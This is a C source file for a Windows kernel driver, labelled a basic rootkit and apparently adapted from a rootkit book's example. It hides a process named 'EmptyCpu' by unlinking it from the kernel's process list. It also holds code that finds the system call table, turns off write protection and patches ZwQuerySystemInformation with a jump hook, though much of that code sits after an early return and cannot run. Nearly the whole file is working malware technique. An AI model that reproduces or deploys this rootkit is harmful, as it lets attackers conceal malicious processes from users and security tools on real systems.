// BASIC ROOTKIT that hides processes
// ----------------------------------------------------------
// v0.1 - Initial, Greg Hoglund (hoglund@rootkit.com)
// v0.3 - Added defines to compile on W2K, and comments.  Rich
// v0.4 - Fixed bug while manipulating _SYSTEM_PROCESS array.
//		  Added code to hide process times of the _root_*'s. Creative
// v0.6 - Added way around system call table memory protection, Jamie Butler (butlerjr@acm.org)
// v1.0 - Trimmed code back to a process hider for the book.

#include "hookssdt.h"

UCHAR kbc_code[] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
PLIST_ENTRY64 Remove_Entry = NULL;
PUCHAR Sys_Process;

VOID OnUnload(IN PDRIVER_OBJECT DriverObject)
{
	Ktrace("ROOTKIT: OnUnload called\n");
	if (Remove_Entry) {
		InsertTailList(Sys_Process + 0x188, Remove_Entry);
		Ktrace("ROOTKIT: InsertTailList : %llx", (PULONGLONG)Remove_Entry);
	}
	
	return;

   KIRQL irql = WPOFFx64();
   memcpy(ZwQuerySystemInformation, kbc_code, 12);
   WPONx64(irql);

   // unhook system calls
   UNHOOK_SYSCALL(ZwQuerySystemInformation, OldZwQuerySystemInformation, KeBugCheckEx);

   // Unlock and Free MDL
   if(g_pmdlSystemCall)
   {
      MmUnmapLockedPages(MappedSystemCallTable, g_pmdlSystemCall);
      IoFreeMdl(g_pmdlSystemCall);
   }
}


NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject, 
					 IN PUNICODE_STRING theRegistryPath)
{
   // Register a dispatch function for Unload
   theDriverObject->DriverUnload  = OnUnload; 

   Ktrace("ROOTKIT: Onload called\n");

   Sys_Process = (PUCHAR)PsInitialSystemProcess;
   PLIST_ENTRY64 list_node = Sys_Process + 0x188;

   UCHAR process_name[] = "EmptyCpu";
   INT	length = strlen(process_name);
   do {
	   if (*(PULONGLONG)((PUCHAR)list_node - 0x188 + 0x170) == 0) {
		   PUCHAR image_process_name = (PUCHAR)list_node - 0x188 + 0x2e0;
		   Ktrace("ROOTKIT: Process : %s", image_process_name);
		   if (memcmp(image_process_name, process_name, length) == 0) {
			   Remove_Entry = list_node;
			   RemoveEntryList(list_node);
			   Ktrace("ROOTKIT: RemoveEntryList : %llx-%s", (PULONGLONG)Remove_Entry, image_process_name);
		   }  
	   }
	   list_node = list_node->Flink;
   } while (Sys_Process != (PUCHAR)list_node - 0x188);

   return STATUS_SUCCESS;

   //PUCHAR test1 = &PsInitialSystemProcess;
   //return STATUS_SUCCESS;

   PUCHAR	pucStartSearchAddress = (PUCHAR)__readmsr(0xC0000082);
   PUCHAR	pucEndSearchAddress = pucStartSearchAddress + SEARCH_RANGE;
   PUCHAR	pdwFindCodeAddress = NULL;
   //ULONG_PTR   SSDT = 0;
  
   for (; pucStartSearchAddress < pucEndSearchAddress; pucStartSearchAddress++)
   {
	   if ((*(PWORD)pucStartSearchAddress & 0xFFFF) == 0x8d4c && (*(PWORD)(pucStartSearchAddress + 7) & 0xFFFF) == 0x8d4c && (*(PWORD)(pucStartSearchAddress + 14) & 0xFFFF) == 0x83f7)
	   {
		   pdwFindCodeAddress = *(PDWORD)(pucStartSearchAddress + 3) + pucStartSearchAddress + 7;
		   KeServiceDescriptorTable = *(PServiceDescriptorTableEntry_t)pdwFindCodeAddress;
		   //SSDT = (ULONG_PTR)pdwFindCodeAddress +
		   //	(((*(PDWORD)pdwFindCodeAddress) >> 24) + 7) + //ae
		   //	(ULONG_PTR)(((*(PDWORD)(pdwFindCodeAddress + 1)) & 0xFFFF) << 8); //id4c
		   OldZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)(SYSTEMSERVICE(ZwQuerySystemInformation));
		   Ktrace("OldZwQuerySystemInformation: %llx", (PULONGLONG)OldZwQuerySystemInformation);

		   //PUCHAR	test2 = (PUCHAR)NewZwQuerySystemInformation;
		   break;
	   }
   }

   KIRQL irql = WPOFFx64();

   //PUCHAR	test2 = (PUCHAR)NewZwQuerySystemInformation;
   ULONG64 myfun;
   UCHAR jmp_code[] = "\x48\xB8\xFF\xFF\xFF\xFF\xFF\xFF\xFF\x00\xFF\xE0";
   myfun = (ULONGLONG)NewZwQuerySystemInformation;
   memcpy(jmp_code + 2, &myfun, 8);
   //irql = WPOFFx64();
   memcpy(kbc_code, ZwQuerySystemInformation, 12);
   //memset(KeBugCheckEx, 0x90, 12);
   memcpy(ZwQuerySystemInformation, jmp_code, 12);
   //WPONx64(irql);

   WPONx64(irql);

   // Initialize global times to zero
   // These variables will account for the 
   // missing time our hidden processes are
   // using.
   m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;

   // save old system call locations

   // Map the memory into our domain so we can change the permissions on the MDL
   //g_pmdlSystemCall = MmCreateMdl(NULL, KeServiceDescriptorTable.ServiceTableBase, KeServiceDescriptorTable.NumberOfServices*4);
   g_pmdlSystemCall = IoAllocateMdl(KeServiceDescriptorTable.ServiceTableBase, KeServiceDescriptorTable.NumberOfServices * 4, FALSE, FALSE, NULL);
   if(!g_pmdlSystemCall)
      return STATUS_UNSUCCESSFUL;

   MmBuildMdlForNonPagedPool(g_pmdlSystemCall);

   // Change the flags of the MDL
   g_pmdlSystemCall->MdlFlags = g_pmdlSystemCall->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;

   //MappedSystemCallTable = MmMapLockedPages(g_pmdlSystemCall, KernelMode);
   MappedSystemCallTable = (PULONG)MmMapLockedPagesSpecifyCache(g_pmdlSystemCall, KernelMode, MmWriteCombined, KeServiceDescriptorTable.ServiceTableBase, FALSE, NormalPagePriority);
   //PUCHAR test5 = (PUCHAR)KeServiceDescriptorTable.ServiceTableBase;
   //PUCHAR test4 = (PUCHAR)MappedSystemCallTable;
   //// hook system calls
   //PUCHAR test1 = ((PUCHAR)KeBugCheckEx - KeServiceDescriptorTable.ServiceTableBase) << 4;
   //ULONG test2 = SYSCALL_INDEX(ZwQuerySystemInformation);
   //PUCHAR test3 = (PUCHAR)&MappedSystemCallTable[SYSCALL_INDEX(ZwQuerySystemInformation)];

   Ktrace("KeBugCheckEx: %x", (PUCHAR)KeBugCheckEx);

   HOOK_SYSCALL(ZwQuerySystemInformation, KeBugCheckEx, OldZwQuerySystemInformation);

   Ktrace("NewZwQuerySystemInformation: %x", SYSTEMSERVICE(ZwQuerySystemInformation));

                              
   return STATUS_SUCCESS;
}
